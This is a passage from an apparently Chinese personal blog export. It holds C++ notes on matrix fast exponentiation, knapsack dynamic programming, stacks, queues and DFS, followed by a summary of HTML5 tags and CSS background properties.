<blockquote>
<p>输出格式<br>输出A^k<br>共n行，每行n个数，第i行第j个数表示矩阵第i行第j列的元素，每个元素模10^9+7</p>
</blockquote>
<blockquote>
<blockquote>
<p>例输入<br>2 1<br>1 1<br>1 1<br>例输出<br>1 1<br>1 1</p>
</blockquote>
</blockquote>
<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line">ll n,m;</span><br><span class="line"><span class="keyword">const</span> ll mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">jz</span>  //矩阵结构体 </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	ll a[<span class="number">141</span>][<span class="number">141</span>];</span><br><span class="line">&#125;a,rec;</span><br><span class="line"> </span><br><span class="line"> <span class="function">jz <span class="title">multi</span><span class="params">(jz a,jz b)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> 	jz t;</span><br><span class="line"> 	<span class="built_in">memset</span>(t.a,<span class="number">0</span>,<span class="keyword">sizeof</span>(t.a));</span><br><span class="line"> 	<span class="keyword">for</span>(ll i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line"> 		<span class="keyword">for</span>(ll j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line"> 			<span class="keyword">for</span>(ll k=<span class="number">1</span>;k&lt;=n;k++)</span><br><span class="line"> 				t.a[i][j]=(t.a[i][j]%mod+((a.a[i][k]%mod)*(b.a[k][j]%mod))%mod)%mod;</span><br><span class="line"> 	<span class="keyword">return</span> t;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="function">jz <span class="title">pow</span><span class="params">(jz a,ll s)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">  	jz b=a;</span><br><span class="line">  	<span class="keyword">while</span>(s)</span><br><span class="line">  	&#123;</span><br><span class="line">  		<span class="keyword">if</span>(s&amp;<span class="number">1</span>)</span><br><span class="line">  			rec=multi(rec,b);</span><br><span class="line">  		b=multi(b,b);</span><br><span class="line">  		s&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">	<span class="keyword">return</span> rec;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">  	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">  	<span class="keyword">for</span>(ll i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">  		<span class="keyword">for</span>(ll j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">  			<span class="built_in">scanf</span>(<span class="string">"%lld"</span>,&amp;a.a[i][j]);</span><br><span class="line">  	rec=a;</span><br><span class="line">  	<span class="built_in">pow</span>(a,m<span class="number">-1</span>);</span><br><span class="line">  	<span class="keyword">for</span>(ll i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">  	&#123;</span><br><span class="line">  		<span class="keyword">for</span>(ll j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">  			<span class="built_in">printf</span>(<span class="string">"%lld "</span>,rec.a[i][j]);</span><br><span class="line">  		<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">	  &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="Fibonacci-POJ3070"><a href="#Fibonacci-POJ3070" class="headerlink" title="Fibonacci POJ3070"></a>Fibonacci POJ3070</h2><p><a href="http://poj.org/problem?id=3070" target="_blank" rel="noopener">详情戳戳我！！！！</a><br><img src="https://i.loli.net/2019/09/16/8k63nSICd9QlDWw.png" alt="Z_`_SRIJS21XGN_2`4VM67U.png"></p>
<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>已知斐波那契数列F[0]=0,F[1]=1,F[2]=1,F[3]=2,F[4]=3。<br>即f[i] = 1* f[i-1]+1* f[i-2] ；f[i-1] = 1* f[i-1] + 0*f[i-2];</p>
<h4 id="模板一"><a href="#模板一" class="headerlink" title="模板一~"></a>模板一~</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line">ll n;</span><br><span class="line"><span class="keyword">const</span> ll mod=<span class="number">10000</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">jz</span>  //矩阵结构体 </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	ll a[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line"> &#125;base,rec;</span><br><span class="line"> </span><br><span class="line"> <span class="function">jz <span class="title">multi</span><span class="params">(jz a,jz b)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> 	jz t;</span><br><span class="line"> 	<span class="built_in">memset</span>(t.a,<span class="number">0</span>,<span class="keyword">sizeof</span>(t.a));</span><br><span class="line"> 	<span class="keyword">for</span>(ll i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)</span><br><span class="line"> 		<span class="keyword">for</span>(ll j=<span class="number">0</span>;j&lt;<span class="number">2</span>;j++)</span><br><span class="line"> 			<span class="keyword">for</span>(ll k=<span class="number">0</span>;k&lt;<span class="number">2</span>;k++)</span><br><span class="line"> 				t.a[i][j]=(t.a[i][j]%mod+((a.a[i][k]%mod)*(b.a[k][j]%mod))%mod)%mod;</span><br><span class="line"> 	<span class="keyword">return</span> t;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="function">jz <span class="title">pow</span><span class="params">(jz a,ll s)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">  	jz b=a;</span><br><span class="line">  	<span class="keyword">while</span>(s)</span><br><span class="line">  	&#123;</span><br><span class="line">  		<span class="keyword">if</span>(s&amp;<span class="number">1</span>)</span><br><span class="line">  			rec=multi(rec,b);</span><br><span class="line">  		b=multi(b,b);</span><br><span class="line">  		s&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">	<span class="keyword">return</span> rec;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">  	<span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%lld"</span>,&amp;n)!=EOF&amp;&amp;n!=<span class="number">-1</span>)</span><br><span class="line">  	&#123;</span><br><span class="line">  		<span class="built_in">memset</span>(base.a,<span class="number">0</span>,<span class="keyword">sizeof</span>(base.a));</span><br><span class="line">  		<span class="built_in">memset</span>(rec.a,<span class="number">0</span>,<span class="keyword">sizeof</span>(rec.a));</span><br><span class="line">  		base.a[<span class="number">0</span>][<span class="number">0</span>]=base.a[<span class="number">0</span>][<span class="number">1</span>]=base.a[<span class="number">1</span>][<span class="number">0</span>]=rec.a[<span class="number">0</span>][<span class="number">0</span>]=rec.a[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">  	    base.a[<span class="number">1</span>][<span class="number">1</span>]=rec.a[<span class="number">1</span>][<span class="number">0</span>]=rec.a[<span class="number">0</span>][<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">  		<span class="built_in">pow</span>(base,n);</span><br><span class="line">  		<span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,rec.a[<span class="number">0</span>][<span class="number">1</span>]);</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h1 id="dp"><a href="#dp" class="headerlink" title="dp"></a>dp</h1><h2 id="01背包问题"><a href="#01背包问题" class="headerlink" title="01背包问题"></a>01背包问题</h2><blockquote>
<p>有n个重量和价值分别为W<sub>i</sub>,V<sub>i</sub>。从这些物品中挑选总重量不超过W的物品，求所有挑选方案中的价值总和的最大值。</p>
</blockquote>
<p>输入：<br>n=4<br>(w,v)={(2,3),(1,2),(3,4),(2,2)}<br>W=5</p>
<p>输出：<br>7（选择第0，1，3号物品）</p>
<h3 id="逆向进行"><a href="#逆向进行" class="headerlink" title="逆向进行"></a>逆向进行</h3><p>记dp[i][j]为根据rec的定义,从第i个物品开始挑选总重小于j时,总价值的最大值。有如下递推式:<br><img src="https://i.loli.net/2019/09/28/S1n6jL9ETY5cRAg.png" alt="_~_WP_MMW_4CY~M___O__7M.png"></p>
<h4 id="dp-O-nW"><a href="#dp-O-nW" class="headerlink" title="dp  O(nW)"></a>dp  O(nW)</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX=<span class="number">150</span>;</span><br><span class="line"><span class="keyword">int</span> n,w;</span><br><span class="line"><span class="keyword">int</span> W[MAX],V[MAX];</span><br><span class="line"><span class="keyword">int</span> dp[MAX+<span class="number">1</span>][MAX+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=w;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(j&lt;W[i])</span><br><span class="line">				dp[i][j]=dp[i+<span class="number">1</span>][j]; <span class="comment">//不选择</span></span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				dp[i][j]=max(dp[i+<span class="number">1</span>][j],dp[i+<span class="number">1</span>][j-W[i]]+V[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;dp[<span class="number">0</span>][w];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;w;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;W[i];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;V[i];</span><br><span class="line">	<span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">	solve();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="记忆化搜索-O-nW"><a href="#记忆化搜索-O-nW" class="headerlink" title="记忆化搜索 O(nW)"></a>记忆化搜索 O(nW)</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX=<span class="number">150</span>;</span><br><span class="line"><span class="keyword">int</span> n,w;</span><br><span class="line"><span class="keyword">int</span> W[MAX],V[MAX];</span><br><span class="line"><span class="keyword">int</span> dp[MAX+<span class="number">1</span>][MAX+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rec</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(dp[i][j]&gt;=<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> dp[i][j];</span><br><span class="line">	<span class="keyword">int</span> res;</span><br><span class="line">	<span class="keyword">if</span>(i==n)</span><br><span class="line">		res=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(j&lt;W[i])</span><br><span class="line">	&#123;</span><br><span class="line">		res=rec(i+<span class="number">1</span>,j);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		res=max(rec(i+<span class="number">1</span>,j),rec(i+<span class="number">1</span>,j-W[i])+V[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> dp[i][j]=res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(dp,<span class="number">-1</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;rec(<span class="number">0</span>,w);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;w;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;W[i];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;V[i];</span><br><span class="line">	solve();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="正向进行"><a href="#正向进行" class="headerlink" title="正向进行"></a>正向进行</h3><p><img src="https://i.loli.net/2019/09/28/FGtiZC5uhwTy7m4.png" alt="Q8~_TE_7_4S7`2L_3FG@Z8C.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=w;j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(j&lt;W[i])</span><br><span class="line">					dp[i+<span class="number">1</span>][j]=dp[i][j];</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					dp[i+<span class="number">1</span>][j]=max(dp[i][j],dp[i][j-W[i]]+v[i]);</span><br><span class="line">			&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;dp[n][w];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="stack-queue基础"><a href="#stack-queue基础" class="headerlink" title="stack,queue基础"></a>stack,queue基础</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//stack</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; s;</span><br><span class="line">	s.push(<span class="number">1</span>);</span><br><span class="line">	s.push(<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,s.top());<span class="comment">//2</span></span><br><span class="line">	s.pop();<span class="comment">//移除3</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//queue</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">queue</span>&lt;<span class="keyword">int</span>&gt; que;</span><br><span class="line">	que.push(<span class="number">1</span>);</span><br><span class="line">	que.push(<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,que.front();<span class="comment">//1</span></span><br><span class="line">	que.pop();<span class="comment">//移除3</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="dfs"><a href="#dfs" class="headerlink" title="dfs"></a>dfs</h1><h2 id="Lake-Counting-POJ2386"><a href="#Lake-Counting-POJ2386" class="headerlink" title="Lake Counting POJ2386"></a>Lake Counting POJ2386</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX=<span class="number">150</span>;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">char</span> field[MAX][MAX];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	field[x][y]=<span class="string">'.'</span>;</span><br><span class="line">	<span class="comment">//循环8个方向</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> dx=<span class="number">-1</span>;dx&lt;=<span class="number">1</span>;dx++)</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> dy=<span class="number">-1</span>;dy&lt;=<span class="number">1</span>;dy++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">int</span>  nx=x+dx , ny=y+dy;</span><br><span class="line">			<span class="keyword">if</span>(<span class="number">0</span>&lt;=nx&amp;&amp;nx&lt;n&amp;&amp;<span class="number">0</span>&lt;=ny&amp;&amp;ny&lt;m&amp;&amp;field[nx][ny]==<span class="string">'W'</span>)</span><br><span class="line">				dfs(nx,ny);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;field[i][j];</span><br><span class="line">	<span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(field[i][j]==<span class="string">'W'</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				dfs(i,j);</span><br><span class="line">				res++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;res&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><del>后续补充qwq</del></p>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>矩阵快速幂</tag>
        <tag>快速幂</tag>
        <tag>dp</tag>
        <tag>stack</tag>
        <tag>queue</tag>
        <tag>dfs</tag>
        <tag>bfs</tag>
      </tags>
  </entry>
  <entry>
    <title>htmlcss归纳</title>
    <url>/2019/08/25/html/</url>
    <content><![CDATA[<h1 id="html新增标签"><a href="#html新增标签" class="headerlink" title="html新增标签"></a>html新增标签</h1><h2 id="结构标签"><a href="#结构标签" class="headerlink" title="结构标签"></a>结构标签</h2><ul>
<li>&lt; article&gt;  标记定义一篇文章</li>
<li>&lt; header&gt; 标记定义一个页面或一个区域的头部</li>
<li>&lt; nav&gt;  标记定义导航链接</li>
<li>&lt; section&gt; 标记顶定义一个区域</li>
<li>&lt; aside&gt; 标记定义页面内容部分的侧边栏</li>
<li>&lt; hgroup&gt; 标记定义文件中的一个区块的相关信息</li>
<li>&lt; figure&gt; 标记定义一组媒体内容以及他们的标题</li>
<li>&lt; footer&gt; 标记定义一个页面或一个区域的底部</li>
<li>&lt; dialog&gt; 标记定义一个对话框<br>&lt; h1&gt;标题1&lt; /h1&gt;….</li>
</ul>
<h2 id="多媒体标签"><a href="#多媒体标签" class="headerlink" title="多媒体标签"></a>多媒体标签</h2><ul>
<li>&lt; video&gt; 标记定义一个视频</li>
<li>&lt; audio&gt; 标记定义音频内容</li>
<li>&lt; source&gt; 标记定义媒体资源</li>
<li>&lt; canvas&gt; 标记定义图片</li>
<li>&lt; embed&gt; 标记定义外部的可交互的内容或插件，如flash</li>
</ul>
<h2 id="Web标签"><a href="#Web标签" class="headerlink" title="Web标签"></a>Web标签</h2><h3 id="状态标签"><a href="#状态标签" class="headerlink" title="状态标签"></a>状态标签</h3><ul>
<li>&lt; meter&gt;  状态标签（实时状态显示：气压，气温）</li>
<li>&lt; progress&gt; 状态标签（任务过程：安装，加载）</li>
</ul>
<h3 id="列表标签"><a href="#列表标签" class="headerlink" title="列表标签"></a>列表标签</h3><ul>
<li>&lt; datalist&gt; 为input标记定义一个下拉列表，配合option</li>
<li>&lt; details&gt; 标记定义一个元素的详细内容，配合summary</li>
</ul>
<h3 id="Menu"><a href="#Menu" class="headerlink" title="Menu"></a>Menu</h3><ul>
<li>&lt; menu&gt; 命令列表（浏览器不支持）</li>
<li>&lt; menuitem&gt; menu命令列表标签</li>
<li>&lt; command&gt; menu标记定义一个命令按钮（只有IE9支持）</li>
</ul>
<h2 id="其他标签"><a href="#其他标签" class="headerlink" title="其他标签"></a>其他标签</h2><h3 id="注释标签"><a href="#注释标签" class="headerlink" title="注释标签"></a>注释标签</h3><ul>
<li>&lt; ruby&gt; 标牌机定义注释或音标</li>
<li>&lt; rt&gt; 标记定义对ruby的注释内容文本</li>
<li>&lt; rp&gt; 告诉不支持ruby元素的浏览器如何去显示</li>
</ul>
<h3 id="标记标签"><a href="#标记标签" class="headerlink" title="标记标签"></a>标记标签</h3><ul>
<li>&lt; mark&gt; 标记定义有标记的文本（黄色选中状态）</li>
<li>&lt; output&gt; 标记定义一些输出类型，计算表单吧、结果配合oninput事件</li>
<li>&lt; keygen&gt; 标记定义表单里一个生成的键值</li>
</ul>
<h2 id="重定义标签"><a href="#重定义标签" class="headerlink" title="重定义标签"></a>重定义标签</h2><ul>
<li>&lt; b&gt; 代表内联文本，通常时粗体</li>
<li>&lt; i&gt; 代表内联文本，通常时斜体</li>
<li>&lt; dd&gt; 可以同dtails与figure一同使用，定义包含文本，dialog也可以用  描述</li>
<li>&lt; dt&gt;  可以同dtails与figure一同使用，汇总细节，dialog也可以用 标题</li>
<li>&lt; hr&gt;  表示主题结束，而不是水平线，虽然显示相同</li>
<li>&lt; small&gt; 表示小字体，例如打印注释或者法律条款</li>
<li>&lt; strong&gt; 表示重要性而不是强调符号</li>
</ul>
<h1 id="html属性的变化"><a href="#html属性的变化" class="headerlink" title="html属性的变化"></a>html属性的变化</h1><h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p>email/url/number/range/Data picker/search/color/tel</p>
<h2 id="表单属性"><a href="#表单属性" class="headerlink" title="表单属性"></a>表单属性</h2><ul>
<li>autocomlete:form或input域应该拥有自动完成功能，即保存功能</li>
<li>autofocus: 规定页面加载，域自动的获得焦点</li>
<li>multiple：规定输入域中可原则多个值</li>
<li>placeholder:提供一种提示（hint），描述输入域所期待的值<blockquote>
<p>placeholder适用于&lt; input&gt;标签type属性值为：text,search,url,telephone,email,password.</p>
</blockquote>
</li>
<li>required:规定必须在提交之前填写输入域<blockquote>
<p>required 适用于&lt; input&gt;标签type属性值为：text,search,telephone,email,password,data pickers,number,checkbox,radio,file.</p>
</blockquote>
</li>
</ul>
<h2 id="链接属性"><a href="#链接属性" class="headerlink" title="链接属性"></a>链接属性</h2><h3 id="size"><a href="#size" class="headerlink" title="size"></a>size</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>= <span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"icon.gif"</span> <span class="attr">type</span>=<span class="string">"image/gif"</span> <span class="attr">sizes</span>=<span class="string">"16x16"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="target"><a href="#target" class="headerlink" title="target"></a>target</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"http://locakhost"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--_blank默认此网站的超链接都是跳转一个新窗口，不添加时默认为_self--&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h3><ul>
<li>a : media=”” (表示对设备进行优化, handhelp对”手持“设备进行支持, tv对”电视“设备进行支持) ;</li>
<li>a: hreflang=”zh” (设置语言,这里设置语言是中文) ;</li>
<li>a: rel= “external” (设置超链接的引用,这里超链接为外部链接)。</li>
</ul>
<h3 id="其他属性"><a href="#其他属性" class="headerlink" title="其他属性"></a>其他属性</h3><h4 id="script"><a href="#script" class="headerlink" title="script"></a>script</h4><ul>
<li>defer:加载完脚本后不执行，而是等待整个页面加载完之后再执行</li>
<li>async:加载完脚本后立刻执行，不用等整个页面都加载完，属于异步执行</li>
</ul>
<h4 id="html"><a href="#html" class="headerlink" title="html"></a>html</h4><p>manifest= “cache.manifest”(定义页面离线应用文件)</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">manifest</span>= <span class="string">"cache.manifest"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="scoped"><a href="#scoped" class="headerlink" title="scoped"></a>scoped</h4><p>内嵌CSS</p>
<h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="CSS背景图像大小"><a href="#CSS背景图像大小" class="headerlink" title="CSS背景图像大小"></a>CSS背景图像大小</h2><blockquote>
<p>background-size语法</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">background-size:length|percentage|cover|contain;</span><br><span class="line">#第二个值可有可无，如没有默认为auto</span><br><span class="line">#当只设置第一个值时，第二值根据图片宽度值来等比缩放</span><br><span class="line">#cover：即将背景图片等比缩放以填满整个容器</span><br><span class="line">#contain：即将背景图片等比缩放至某一边紧贴容器边缘为止</span><br></pre></td></tr></table></figure>

<h2 id="CSS多重背景图像"><a href="#CSS多重背景图像" class="headerlink" title="CSS多重背景图像"></a>CSS多重背景图像</h2><blockquote>
<p>background-image语法</p>
</blockquote>
